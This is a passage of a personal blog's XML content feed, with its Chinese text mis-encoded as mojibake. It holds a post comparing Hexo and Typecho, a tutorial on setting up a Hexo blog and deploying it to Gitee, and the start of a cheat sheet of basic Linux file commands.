¸cpu+4GBå†…å­˜+1Må®½å¸¦+40GBçš„ç³»ç»Ÿç›˜ï¼Œè¿™ä¸ªé…ç½®ç®—ä¸‹æ¥åº”è¯¥ä¹Ÿè¦äº”å…­ç™¾å§äººæ°‘å¸ã€‚ä½†æ˜¯æˆ‘é¢†å–äº†ä»¥åä¹Ÿä¸çŸ¥é“æ‹¿æ¥å¹²å˜›ï¼Œæˆ‘ä¹‹å‰æ­å»ºçš„Hexoåšå®¢ä¸éœ€è¦æœåŠ¡å™¨å°±å¯ä»¥æ­å»ºï¼Œæ‰€ä»¥æœåŠ¡å™¨å°±ä¸€ç›´é—²ç½®ç€ã€‚å‰å‡ å¤©åˆšå¥½çœ‹åˆ°ä¸€ä¸ªITä¹‹å®¶ç½‘å‹åˆ†äº«çš„typechoåšå®¢ï¼Œç„¶åå°±æƒ³æ­å»ºä¸€ä¸ªï¼Œä¹Ÿä¸ç®—æ˜¯æµªè´¹äº†æœåŠ¡å™¨ã€‚ç„¶åä¸€ç•ªæŠ˜è…¾ç»ˆäºæ­å»ºå¥½äº†ï¼Œä¸»é¢˜ç”¨çš„æ˜¯<a href="https://eriri.ink/archives/Typecho-Theme-Aria.html" target="_blank" rel="noopener">Aria</a>ã€‚ä½†æ˜¯æˆªæ­¢åˆ°ä»Šå¤©ï¼Œæˆ‘çš„åŸŸåå¤‡æ¡ˆè¿˜æ²¡é€šè¿‡ï¼Œæ‰€ä»¥typechoçš„åšå®¢è¿˜æ˜¯åˆ©ç”¨æˆ‘çš„æœåŠ¡å™¨IPæ¥è¿›è¡Œè®¿é—®ã€‚</p>
<p>è¿™æ˜¯æˆ‘çš„<a href="http://47.92.93.189/" target="_blank" rel="noopener">typechoåšå®¢</a>ï¼Œä¸»é¢˜æ˜¯<a href="https://eriri.ink/archives/Typecho-Theme-Aria.html" target="_blank" rel="noopener">Aria</a></p>
<p>è¿™æ˜¯æˆ‘çš„<a href="https://yalexin.gitee.io/">Hexoåšå®¢</a>ï¼Œä¸»é¢˜æ˜¯<a href="https://github.com/theme-next/hexo-theme-next" target="_blank" rel="noopener">Next</a></p>
<p>ç›®å‰æ˜¯æ–‡ç« ä¸¤è¾¹åŒæ—¶æ›´æ–°ï¼Œæ‰€ä»¥å°±ç›¸å½“äºåŒä¸€ä¸ªåšå®¢ä¸åŒä¸»é¢˜å§ï¼ˆ<del>~</del>ï¼‰ã€‚</p>
<h2 id="è¿™äºŒè€…åšå®¢çš„åŒºåˆ«"><a href="#è¿™äºŒè€…åšå®¢çš„åŒºåˆ«" class="headerlink" title="è¿™äºŒè€…åšå®¢çš„åŒºåˆ«"></a>è¿™äºŒè€…åšå®¢çš„åŒºåˆ«</h2><ul>
<li><p>Hexo</p>
<ul>
<li>å®ƒåŸºäºnode.jsï¼Œæ˜¯ä¸€ä¸ªé™æ€åšå®¢ï¼Œå…³äºä»€ä¹ˆæ˜¯é™æ€webå’ŒåŠ¨æ€webï¼Œ<a href="https://blog.csdn.net/qq_33915826/article/details/81172555" target="_blank" rel="noopener">è¿™é‡Œ</a>æœ‰è¯´æ˜ï¼ŒHexoæ¯”è¾ƒè½»é‡ï¼Œè®¿é—®é€Ÿåº¦æ¯”è¾ƒå¿«ï¼Œæ‰˜ç®¡æ–¹ä¾¿ï¼Œå‡ ä¹ä¸ç”¨æ‹…å¿ƒæ•°æ®ä¸¢å¤±çš„é—®é¢˜ï¼Œåœ¨æ²¡æœ‰æœåŠ¡å™¨æƒ…å†µä¸‹ä¹Ÿå¯ä»¥æ­å»ºã€‚</li>
<li>ä½†æ˜¯æ¯æ¬¡å‘å¸ƒæ–‡ç« éƒ½è¦è¾“å…¥å‘½ä»¤ï¼Œé‡æ–°æ¸²æŸ“æˆHTMLæ–‡ä»¶</li>
<li>ç§»åŠ¨ç«¯å†™æ–‡ç« ä¸å¤ªæ–¹ä¾¿</li>
</ul>
</li>
<li><p>Typecho</p>
<ul>
<li>å®ƒåŸºäºPHP+ MySQL æ•°æ®åº“ ï¼Œåªéœ€è¦ä»…ä»…ä¸ƒå¼ æ•°æ®è¡¨ï¼Œä»¥åŠä¸è¶³500KBçš„ä»£ç æ–‡ä»¶ï¼Œå°±å¯ä»¥æ„å»ºåšå®¢æ¡†æ¶ï¼Œå†™æ–‡ç« ååˆ†æ–¹ä¾¿ï¼Œæ”¯æŒåŸç”ŸMarkdownè¯­æ³•ï¼Œåªè¦æœ‰ç½‘ç»œå°±å¯ä»¥è¿›è¡Œå‘å¸ƒæ–‡ç« ï¼Œä¿®æ”¹æ–‡ç« ï¼Œåˆ é™¤æ–‡ç« ç­‰æ“ä½œã€‚</li>
<li>éœ€è¦é¢å¤–çš„æœåŠ¡å™¨ï¼ŒåŸŸåï¼ˆå½“ç„¶äº†ï¼Œä¹Ÿå¯ä»¥ç”¨æœåŠ¡å™¨çš„ipæ¥è®¿é—®ï¼‰ç­‰</li>
<li>æ¨¡æ¿æ’ä»¶æ¯”è¾ƒå°‘</li>
</ul>
</li>
</ul>
<h2 id="æœ€å"><a href="#æœ€å" class="headerlink" title="æœ€å"></a>æœ€å</h2><p>ç›®å‰é‡å¿ƒä¸»è¦æ”¾åœ¨Typechoä¸Šé¢ï¼Œç­‰å“ªä¸€å¤©æ²¡é’±ç»­è´¹æœåŠ¡å™¨ï¼Œå†è½¬å›Hexoï¼Œåæ­£ç›®å‰ä¸¤è¾¹éƒ½åŒä¸€æ—¶é—´æ›´æ–°ï¼Œä¸ç”¨æ‹…å¿ƒæ•°æ®ä¸åŒæ­¥çš„é—®é¢˜ï¼Œä½†æ˜¯å¯èƒ½è¯„è®ºè¿ç§»æ¯”è¾ƒå›°éš¾ã€‚</p>
]]></content>
      <categories>
        <category>åšå®¢</category>
      </categories>
  </entry>
  <entry>
    <title>æ­å»ºHexoåšå®¢å¹¶éƒ¨ç½²åˆ°ç äº‘</title>
    <url>/2020/02/22/%E5%8F%91%E5%B8%83%E5%8D%9A%E6%96%87/</url>
    <content><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>æˆ‘ä¸ºä»€ä¹ˆè¦æ­å»ºåšå®¢ï¼Ÿè¯´å®è¯æˆ‘ä¸ªäººè®°å¿†åŠ›æ¯”è¾ƒå·®ï¼Œå­¦è¿‡çš„ä¸œè¥¿ç»å¸¸ä¼šå¾ˆå¿«å¿˜è®°ï¼Œæˆ‘è‡ªå·±åˆä¸çˆ±åšç¬”è®°ï¼Œå†µä¸”å‡å¦‚å†™åœ¨äº†ç¬”è®°æœ¬ä¸Šï¼Œç¬”è®°æœ¬åˆä¼šè¢«æˆ‘å¼„ä¸¢ï¼Œæ‰€ä»¥æƒ³åˆ°äº†æŠŠå­¦è¿‡çš„ä¸œè¥¿è®°åœ¨åšå®¢ä¸Šè¿™ç§æ–¹æ³•ï¼Œä½†æ˜¯æˆ‘åˆä¸ä¼šwebå¼€å‘ï¼Œåˆšå¥½åœ¨åˆ«çš„åœ°æ–¹äº†è§£åˆ°æœ‰hexoç­‰çš„å¼€æºåšå®¢æ¡†æ¶ï¼Œå¿ƒè¡€æ¥æ½®ï¼Œè¶ç€æ”¾å¯’å‡çš„æ—¶é—´å°±æ­å»ºäº†èµ·æ¥ã€‚</p>
<h2 id="ä¸‹è½½å®‰è£…Node-js"><a href="#ä¸‹è½½å®‰è£…Node-js" class="headerlink" title="ä¸‹è½½å®‰è£…Node.js"></a>ä¸‹è½½å®‰è£…Node.js</h2><p>ä»<a href="https://nodejs.org/en/" target="_blank" rel="noopener">å®˜ç½‘</a>ä¸‹è½½å®‰è£…ï¼Œå®‰è£…å®Œæ¯•ååœ¨ç»ˆç«¯è¾“å…¥</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">node -v</span><br></pre></td></tr></table></figure>

<p>å‡å¦‚å‡ºç°ç‰ˆæœ¬å·åˆ™è¯´æ˜å®‰è£…æˆåŠŸï¼Œå¦åˆ™éœ€è¦æ‰‹åŠ¨åœ¨ç³»ç»Ÿçš„ç¯å¢ƒå˜é‡ä¸‹çš„Pathçš„å€¼ä¸­æ·»åŠ nodeçš„å®‰è£…è·¯å¾„ã€‚</p>
<h2 id="å®‰è£…Git"><a href="#å®‰è£…Git" class="headerlink" title="å®‰è£…Git"></a>å®‰è£…Git</h2><p>è¿™ä¸ªæ­¥éª¤åº”è¯¥ä¸éš¾ï¼Œç½‘ä¸Šçš„æ•™ç¨‹å®åœ¨æ˜¯å¤ªå¤šå¤ªè¯¦ç»†äº†ã€‚</p>
<h2 id="å®‰è£…hexoç›¸å…³æ–‡ä»¶ï¼š"><a href="#å®‰è£…hexoç›¸å…³æ–‡ä»¶ï¼š" class="headerlink" title="å®‰è£…hexoç›¸å…³æ–‡ä»¶ï¼š"></a>å®‰è£…hexoç›¸å…³æ–‡ä»¶ï¼š</h2><p>åœ¨ä¸€ä¸ªä½ å–œæ¬¢çš„åœ°æ–¹ï¼Œæ–°å»ºä¸€ä¸ªæ–‡ä»¶å¤¹ï¼Œæœ€å¥½è¿™ä¸ªè·¯å¾„ä¸è¦åŒ…å«ä¸­æ–‡è·¯å¾„ï¼Œåœ¨cmdçª—å£è¾“å…¥</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm install hexo-cli -g</span><br></pre></td></tr></table></figure>
<h2 id="åˆå§‹åŒ–åšå®¢æ–‡ä»¶å¤¹ï¼š"><a href="#åˆå§‹åŒ–åšå®¢æ–‡ä»¶å¤¹ï¼š" class="headerlink" title="åˆå§‹åŒ–åšå®¢æ–‡ä»¶å¤¹ï¼š"></a>åˆå§‹åŒ–åšå®¢æ–‡ä»¶å¤¹ï¼š</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hexo init blog</span><br></pre></td></tr></table></figure>
<h2 id="è¿›å…¥åšå®¢æ–‡ä»¶å¤¹ï¼š"><a href="#è¿›å…¥åšå®¢æ–‡ä»¶å¤¹ï¼š" class="headerlink" title="è¿›å…¥åšå®¢æ–‡ä»¶å¤¹ï¼š"></a>è¿›å…¥åšå®¢æ–‡ä»¶å¤¹ï¼š</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd blog</span><br></pre></td></tr></table></figure>
 <a id="more"></a> 

<h2 id="å®‰è£…æ’ä»¶ï¼š"><a href="#å®‰è£…æ’ä»¶ï¼š" class="headerlink" title="å®‰è£…æ’ä»¶ï¼š"></a>å®‰è£…æ’ä»¶ï¼š</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm install</span><br></pre></td></tr></table></figure>
<h2 id="æ–°å»ºä¸€ç¯‡æ–‡ç« å‘½ä»¤ï¼š"><a href="#æ–°å»ºä¸€ç¯‡æ–‡ç« å‘½ä»¤ï¼š" class="headerlink" title="æ–°å»ºä¸€ç¯‡æ–‡ç« å‘½ä»¤ï¼š"></a>æ–°å»ºä¸€ç¯‡æ–‡ç« å‘½ä»¤ï¼š</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hexo new "My New Post"</span><br></pre></td></tr></table></figure>

<h2 id="å¯åŠ¨æœåŠ¡é¢„è§ˆ"><a href="#å¯åŠ¨æœåŠ¡é¢„è§ˆ" class="headerlink" title="å¯åŠ¨æœåŠ¡é¢„è§ˆ"></a>å¯åŠ¨æœåŠ¡é¢„è§ˆ</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo server</span><br></pre></td></tr></table></figure>

<p>ç„¶ååœ¨æœ¬åœ°æµè§ˆå™¨è¾“å…¥ <a href="http://localhost:4000/" target="_blank" rel="noopener">http://localhost:4000/</a> ï¼Œå¦‚æœä¸€åˆ‡é¡ºåˆ©ï¼Œé‚£ä¹ˆå°±å¯ä»¥å‡ºç°ä½ çš„åšå®¢äº†ã€‚</p>
<h2 id="éƒ¨ç½²åˆ°ç¬¬ä¸‰æ–¹å¹³å°"><a href="#éƒ¨ç½²åˆ°ç¬¬ä¸‰æ–¹å¹³å°" class="headerlink" title="éƒ¨ç½²åˆ°ç¬¬ä¸‰æ–¹å¹³å°"></a>éƒ¨ç½²åˆ°ç¬¬ä¸‰æ–¹å¹³å°</h2><p>å½“ç„¶äº†ï¼Œæˆ‘ä»¬è‡ªå·±çš„åšå®¢ä¸ä»…ä»…æ˜¯æƒ³è®©è‡ªå·±çœ‹ï¼Œè¿˜æƒ³ç€é€šè¿‡ç½‘ç»œï¼Œè®©æ›´å¤šçš„äººçœ‹åˆ°ï¼Œæˆ‘ä»¬å°±å¯ä»¥å€ŸåŠ©ç¬¬ä¸‰æ–¹å¹³å°çš„pageæœåŠ¡æ¥å±•ç¤ºæˆ‘ä»¬çš„é™æ€ç½‘ç«™äº†ï¼Œä½ å¯ä»¥é€šè¿‡GitHubï¼Œç äº‘ï¼Œcodingç­‰ï¼Œæˆ‘è¿™é‡Œç”¨æ¥ç äº‘ã€‚</p>
<h3 id="æ–°å»ºä»“åº“"><a href="#æ–°å»ºä»“åº“" class="headerlink" title="æ–°å»ºä»“åº“"></a>æ–°å»ºä»“åº“</h3><p>æ³¨å†Œå¥½ç äº‘åï¼Œæ–°å»ºä¸€ä¸ªä»“åº“ï¼Œå°†ä»“åº“çš„åœ°å€ï¼ˆå¯ä»¥æ˜¯HTTPSå½¢å¼çš„ï¼Œä¹Ÿå¯ä»¥æ˜¯SSHå½¢å¼çš„ï¼Œæˆ‘çš„æ˜¯httpsï¼‰å¤åˆ¶ï¼Œæ‰“å¼€åšå®¢æ–‡ä»¶å¤¹ä¸‹çš„_config.ymlæ–‡ä»¶ï¼ˆtheme/theme_name/ä¸‹ä¹Ÿæœ‰ä¸€ä¸ªï¼Œä¸è¦æ··æ·†ï¼‰ï¼Œå°†åˆšåˆšå¤åˆ¶å¥½çš„åœ°å€ç²˜è´´åˆ°giteeçš„å€¼ï¼Œå¹¶åœ¨åé¢åŠ ä¸Šmasteråˆ†æ”¯ï¼š</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">deploy:</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">git</span></span><br><span class="line">  <span class="attr">repo:</span>  </span><br><span class="line">    <span class="attr">gitee:</span> <span class="string">https://gitee.com/xxxxx/xxxx.git,master</span></span><br></pre></td></tr></table></figure>

<h3 id="ä¸è¿œç¨‹ä»“åº“è¿æ¥"><a href="#ä¸è¿œç¨‹ä»“åº“è¿æ¥" class="headerlink" title="ä¸è¿œç¨‹ä»“åº“è¿æ¥"></a>ä¸è¿œç¨‹ä»“åº“è¿æ¥</h3><p>åœ¨åˆšåˆšæ‰“å¼€çš„æ–‡ä»¶å¤¹ä¸­æ‰“å¼€cmdç»ˆç«¯ï¼Œè¾“å…¥ä¸‹é¢å‘½ä»¤ï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git config --global user.nameç©ºæ ¼+ä½ çš„ç äº‘çš„åå­—</span><br><span class="line">git config --global user.emailç©ºæ ¼+ä½ çš„ç äº‘ç»‘å®šçš„é‚®ç®±</span><br></pre></td></tr></table></figure>

<h3 id="å®‰è£…Gitéƒ¨ç½²æ’ä»¶"><a href="#å®‰è£…Gitéƒ¨ç½²æ’ä»¶" class="headerlink" title="å®‰è£…Gitéƒ¨ç½²æ’ä»¶"></a>å®‰è£…Gitéƒ¨ç½²æ’ä»¶</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure>

<h3 id="éƒ¨ç½²"><a href="#éƒ¨ç½²" class="headerlink" title="éƒ¨ç½²"></a>éƒ¨ç½²</h3><p>ç”Ÿæˆé™æ€ç½‘é¡µ</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hexo g</span><br></pre></td></tr></table></figure>

<p>æ¨é€åˆ°è¿œç«¯</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hexo d</span><br></pre></td></tr></table></figure>
<p>æ¥ç€åˆ°ç äº‘å¹³å°ï¼Œæ‰“å¼€ä½ åˆšåˆšå»ºå¥½çš„ä»“åº“ï¼Œå¦‚æœä»“åº“é‡Œè¾¹å‡ºç°æ–°çš„ä¸œè¥¿ï¼Œè¯´æ˜éƒ¨ç½²æˆåŠŸäº†ï¼Œæ¥ç€æˆ‘ä»¬ä¾æ¬¡ç‚¹å‡» æœåŠ¡-&gt;gite pages -&gt; å¼€å¯ï¼Œç„¶åæ‰“å¼€å¹³å°ç»™æˆ‘ä»¬çš„ç½‘å€ï¼Œå°±å¯ä»¥è®¿é—®æˆ‘ä»¬çš„åšå®¢å•¦ï¼</p>
<p>åæœŸå¯ä»¥é€šè¿‡æ›´æ¢ä¸»é¢˜æ¥å¢åŠ ç¾è§‚åº¦ï¼Œä¸»é¢˜å¯ä»¥åœ¨<a href="https://hexo.io/" target="_blank" rel="noopener">hexoå®˜ç½‘</a>ä¸‹è½½ï¼Œä¹Ÿå¯ä»¥åœ¨GitHubä¸‹è½½ï¼Œä¸‹è½½ååœ¨åšå®¢ç›®å½•ä¸‹çš„é…ç½®æ–‡ä»¶_config.ymlä¸­ä¿®æ”¹ä¸»é¢˜çš„åå­—</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment">## Themes: https://hexo.io/themes/</span></span><br><span class="line"><span class="attr">theme:</span> <span class="comment"># your theme name</span></span><br></pre></td></tr></table></figure>


<p>å¹¶å°†ä½ ä¸‹è½½çš„ä¸»é¢˜æ–‡ä»¶å¤¹æ”¾åˆ°åšå®¢ç›®å½•ä¸‹çš„themesæ–‡ä»¶å¤¹ä¸­å°±å¯ä»¥äº†ã€‚</p>
<p>éƒ¨ç½²å®Œæ¯•ï¼Œé‚£æˆ‘ä»¬å¦‚ä½•ç¼–å†™æ–‡ç« ï¼Ÿç”¨æ™®é€šæ–‡æœ¬ç¼–è¾‘å™¨ï¼Ÿç”¨HTMLæ–‡ä»¶ç¼–å†™ï¼Ÿå…¶å®ï¼Œæœ€æ–¹ä¾¿çš„æ˜¯ä½¿ç”¨.mdæ–‡ä»¶ç¼–å†™ï¼Œå…³äºå¦‚ä½•ä½¿ç”¨.mdæ–‡ä»¶ï¼Œè¯·çœ‹<a href="https://yalexin.gitee.io/2020/02/23/markdownè¯­æ³•/">è¿™é‡Œ</a> </p>
]]></content>
      <categories>
        <category>åšå®¢</category>
      </categories>
      <tags>
        <tag>æ•™ç¨‹</tag>
      </tags>
  </entry>
  <entry>
    <title>linuxå¸¸ç”¨å‘½ä»¤</title>
    <url>/2020/02/25/%E5%91%BD%E4%BB%A4/</url>
    <content><![CDATA[<blockquote>
<p>æœ¬æ–‡ç¯‡å¹…è¾ƒå¤§ï¼Œä¸‹é¢æ˜¯ç›®å½•<br><a href="#Bashå¿«æ·é”®">Bashå¿«æ·é”®</a><br><a href="#æ–‡ä»¶åŠç›®å½•æ“ä½œå‘½ä»¤">æ–‡ä»¶åŠç›®å½•æ“ä½œå‘½ä»¤</a><br><a href="#æƒé™ç›¸å…³å‘½ä»¤">æƒé™ç›¸å…³å‘½ä»¤</a><br><a href="#é‡å®šå‘ä¸ç®¡é“å‘½ä»¤">é‡å®šå‘ç›¸å…³ä¸ç®¡é“å‘½ä»¤</a><br><a href="#æŒ‚è½½æ–‡ä»¶ç³»ç»Ÿ">æŒ‚è½½æ–‡ä»¶ç³»ç»Ÿ</a><br><a href="#ç£ç›˜ç®¡ç†">ç£ç›˜ç®¡ç†</a></p>
</blockquote>
<h2 id="Bashå¿«æ·é”®"><a href="#Bashå¿«æ·é”®" class="headerlink" title="Bashå¿«æ·é”®"></a>Bashå¿«æ·é”®</h2><p>åˆ é™¤å…‰æ ‡åˆ°è¡Œé¦–çš„æ‰€æœ‰å­—ç¬¦ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Ctl + U</span><br></pre></td></tr></table></figure>

<p>åˆ é™¤å½“å‰å…‰æ ‡åˆ°å‰è¾¹çš„æœ€è¿‘ä¸€ä¸ªç©ºæ ¼ä¹‹é—´çš„å­—ç¬¦</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Ctl + W</span><br></pre></td></tr></table></figure>

<h2 id="æ–‡ä»¶åŠç›®å½•æ“ä½œå‘½ä»¤"><a href="#æ–‡ä»¶åŠç›®å½•æ“ä½œå‘½ä»¤" class="headerlink" title="æ–‡ä»¶åŠç›®å½•æ“ä½œå‘½ä»¤"></a>æ–‡ä»¶åŠç›®å½•æ“ä½œå‘½ä»¤</h2><h3 id="æ˜¾ç¤ºå½“å‰æ‰€åœ¨ç›®å½•-ç»å¯¹è·¯å¾„"><a href="#æ˜¾ç¤ºå½“å‰æ‰€åœ¨ç›®å½•-ç»å¯¹è·¯å¾„" class="headerlink" title="æ˜¾ç¤ºå½“å‰æ‰€åœ¨ç›®å½• (ç»å¯¹è·¯å¾„)"></a>æ˜¾ç¤ºå½“å‰æ‰€åœ¨ç›®å½• (ç»å¯¹è·¯å¾„)</h3>  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">pwd</span></span></span><br></pre></td></tr></table></figure>

<h3 id="è¿›å…¥æŸä¸ªç›®å½•"><a href="#è¿›å…¥æŸä¸ªç›®å½•" class="headerlink" title="è¿›å…¥æŸä¸ªç›®å½•"></a>è¿›å…¥æŸä¸ªç›®å½•</h3>  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> [path]</span></span><br></pre></td></tr></table></figure>

<p>  è‹¥pathç¼ºçœï¼Œåˆ™ä¼šè¿›å…¥åˆ°ç”¨æˆ·ä¸»ç›®å½•</p>
<h3 id="åˆ—å‡ºå½“å‰ç›®å½•ä¸‹æ‰€æœ‰çš„æ–‡ä»¶"><a href="#åˆ—å‡ºå½“å‰ç›®å½•ä¸‹æ‰€æœ‰çš„æ–‡ä»¶" class="headerlink" title="åˆ—å‡ºå½“å‰ç›®å½•ä¸‹æ‰€æœ‰çš„æ–‡ä»¶"></a>åˆ—å‡ºå½“å‰ç›®å½•ä¸‹æ‰€æœ‰çš„æ–‡ä»¶</h3>  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ls [é€‰é¡¹] [ç›®å½•æˆ–è€…æ–‡ä»¶]</span></span><br></pre></td></tr></table></figure>

<p>  <strong>è¯´æ˜</strong> å¯¹äºç›®å½•ï¼Œè¯¥å‘½ä»¤åˆ—å‡ºå…¶ä¸­æ‰€æœ‰çš„å­ç›®å½•å’Œæ–‡ä»¶ï¼Œç¼ºçœæƒ…å†µä¸‹æ˜¯æŒ‡å‘å½“å‰ç›®å½•ï¼›å¯¹äºæ–‡ä»¶ï¼Œè¯¥å‘½ä»¤åˆ—å‡ºæ–‡ä»¶ååŠå…¶ç›¸å…³çš„æ–‡ä»¶å±æ€§ä¿¡æ¯ã€‚è¯¥å‘½ä»¤å¸¸ç”¨é€‰é¡¹å¦‚ä¸‹è¡¨æ‰€ç¤ºã€‚</p>
<p><a name="æƒé™ç›¸å…³å‘½ä»¤1"></a></p>
<a id="more"></a>



<table>
<thead>
<tr>
<th><strong>å¸¸ç”¨é€‰é¡¹</strong></th>
<th><strong>å«ä¹‰</strong></th>
</tr>
</thead>
<tbody><tr>
<td>-a</td>
<td>Allã€‚åˆ—å‡ºç›®å½•ä¸­å…¨éƒ¨æ–‡ä»¶ï¼ŒåŒ…å«éšè—æ–‡ä»¶ã€çˆ¶ç›®å½•å’Œå½“å‰ç›®å½•ã€‚</td>
</tr>
<tr>
<td>- l</td>
<td>longã€‚åˆ—å‡ºç›®å½•å†…å®¹çš„ç»†èŠ‚ï¼ŒåŒ…æ‹¬æƒé™ã€æ‰€æœ‰è€…ã€ç»„ç¾¤ã€å¤§å°ç­‰ã€‚</td>
</tr>
<tr>
<td>-F</td>
<td>File typeã€‚åœ¨æ¯ä¸€ä¸ªåˆ—ä¸¾é¡¹ç›®åæ·»åŠ ç¬¦å·è¡¨æ˜å…¶ç±»å‹ã€‚</td>
</tr>
<tr>
<td>-R</td>
<td>é€’å½’åˆ—ä¸¾å½“å‰ç›®å½•ä¸‹æ‰€æœ‰ç›®å½•çš„å†…å®¹ã€‚</td>
</tr>
<tr>
<td>-S</td>
<td>Sizeã€‚æŒ‰æ–‡ä»¶å¤§å°æ’åºã€‚</td>
</tr>
</tbody></table>
<h3 id="æ˜¾ç¤ºæ–‡æœ¬æ–‡ä»¶"><a href="#æ˜¾ç¤ºæ–‡æœ¬æ–‡ä»¶" class="headerlink" title="æ˜¾ç¤ºæ–‡æœ¬æ–‡ä»¶"></a>æ˜¾ç¤ºæ–‡æœ¬æ–‡ä»¶</h3>  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> cat fileName</span></span><br></pre></td></tr></table></figure>
<p>  <strong>æ³¨æ„</strong> fileNameéœ€è¦åŒ…å«è·¯å¾„ï¼Œè‹¥ä¸æŒ‡æ˜ï¼Œåˆ™è®¤ä¸ºæ˜¯å½“å‰ç›®å½•,è‹¥è¦æ˜¾ç¤ºè¡Œæ•°ï¼Œæ·»åŠ -né€‰é¡¹å³å¯ã€‚</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> cat fileName -n</span></span><br></pre></td></tr></table></figure>

<p>æŸ¥çœ‹å‰5è¡Œ</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> head -5 fileName</span></span><br></pre></td></tr></table></figure>

<p>æŸ¥çœ‹å5è¡Œ</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> tail -5 filename</span></span><br></pre></td></tr></table></figure>

<p>æŸ¥çœ‹ä¸¤ä¸ªæ–‡ä»¶ä¹‹é—´çš„å·®å¼‚</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> diff filename1 filename2</span></span><br></pre></td></tr></table></figure>

<h3 id="æ–‡ä»¶æˆ–ç›®å½•çš„å¤åˆ¶"><a href="#æ–‡ä»¶æˆ–ç›®å½•çš„å¤åˆ¶" class="headerlink" title="æ–‡ä»¶æˆ–ç›®å½•çš„å¤åˆ¶"></a>æ–‡ä»¶æˆ–ç›®å½•çš„å¤åˆ¶</h3>  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> cp [é€‰é¡¹] æºæ–‡ä»¶æˆ–ç›®å½• ç›®æ ‡ç›®å½•</span></span><br></pre></td></tr></table></figure>

<p>  è‹¥æŒ‡å®šå¤šä¸ªæºæ–‡ä»¶æˆ–è€…ç›®å½•å¤åˆ¶åˆ°ç›®æ ‡ç›®å½•ï¼Œåˆ™æºæ–‡ä»¶æˆ–æºç›®å½•ä¹‹é—´ç”¨ç©ºæ ¼åˆ†éš”ï¼Œå¸¸ç”¨é€‰é¡¹è‹¥ä¸‹è¡¨</p>
<table>
<thead>
<tr>
<th><strong>å¸¸ç”¨é€‰é¡¹</strong></th>
<th><strong>å«ä¹‰</strong></th>
</tr>
</thead>
<tbody><tr>
<td>-a</td>
<td>åœ¨å¤‡ä»½ä¸­å°½å¯èƒ½å¤šçš„ä¿æŒæºæ–‡ä»¶çš„ç»“æ„å’Œå±æ€§ã€‚</td>
</tr>
<tr>
<td>- f</td>
<td>è¦†ç›–å·²ç»å­˜åœ¨çš„ç›®æ ‡æ–‡ä»¶è€Œä¸åŠ ä»¥æç¤ºã€‚</td>
</tr>
<tr>
<td>- i</td>
<td>åœ¨è¦†ç›–ç›®æ ‡æ–‡ä»¶å‰ç»™å‡ºæç¤ºå¹¶è¦æ±‚ç”¨æˆ·ç¡®è®¤ã€‚</td>
</tr>
<tr>
<td>-r</td>
<td>è‹¥æºæ–‡ä»¶ä¸ºç›®å½•ï¼Œé€’å½’å¤åˆ¶è¯¥ç›®å½•ä¸‹æ‰€æœ‰å­ç›®å½•å’Œæ–‡ä»¶ã€‚</td>
</tr>
</tbody></table>
<h3 id="æ–‡ä»¶æˆ–ç›®å½•çš„ç§»åŠ¨ï¼ˆé‡å‘½åï¼‰"><a href="#æ–‡ä»¶æˆ–ç›®å½•çš„ç§»åŠ¨ï¼ˆé‡å‘½åï¼‰" class="headerlink" title="æ–‡ä»¶æˆ–ç›®å½•çš„ç§»åŠ¨ï¼ˆé‡å‘½åï¼‰"></a>æ–‡ä»¶æˆ–ç›®å½•çš„ç§»åŠ¨ï¼ˆé‡å‘½åï¼‰</h3>  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> mv æºæ–‡ä»¶æˆ–è€…ç›®å½• ç›®æ ‡æ–‡ä»¶æˆ–ç›®å½•</span></span><br></pre></td></tr></table></figure>

<p>  å½“ç›®æ ‡ç›®å½•ä¸å­˜åœ¨æ—¶ï¼Œåˆ™å°†æºæ–‡ä»¶æˆ–ç›®å½•é‡å‘½åï¼›è‹¥éœ€è¦å°†å¤šä¸ªæ–‡ä»¶å¤¹æˆ–è€…æ–‡ä»¶ç§»åˆ°æºæ–‡ä»¶ï¼Œå¯ç”¨ä¸‹é¢çš„å‘½ä»¤</p>
  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> mv æ–‡ä»¶1 æ–‡ä»¶2 æ–‡ä»¶3 ... -t ç›®æ ‡æ–‡ä»¶å¤¹</span></span><br></pre></td></tr></table></figure>

